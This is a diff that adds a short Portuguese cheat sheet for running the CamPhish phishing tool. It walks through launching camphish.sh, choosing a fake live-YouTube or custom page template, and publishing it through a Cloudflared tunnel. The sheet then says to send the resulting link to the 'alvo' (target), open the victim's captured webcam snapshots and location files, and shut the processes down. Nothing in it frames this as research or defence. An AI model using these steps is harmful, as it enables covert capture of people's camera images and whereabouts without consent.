@@ -1,0 +1,18 @@
+# CAMPHISH – LOCALIZAÇÃO + SELFIE (já instalado)
+cd ~/CamPhish
+bash camphish.sh
+   # → template: 02 (Live Youtube) ou 10 (Custom)
+   # → túnel: 2 (Cloudflared)
+   # → ID vídeo: qualquer um ou só Enter
+
+# Link que aparecer → manda pro alvo
+
+# Ver fotos rápido:
+xdg-open ~/CamPhish
+
+# Ou copia tudo pro Desktop (conta normal):
+mkdir -p ~/Desktop
+sudo cp -r ~/CamPhish/cam*.png ~/CamPhish/location*.* ~/Desktop/ 2>/dev/null
+xdg-open ~/Desktop
+
+# parar depois: Ctrl+C ou novo terminal → pkill -f camphish.sh; pkill cloudflared; pkill php
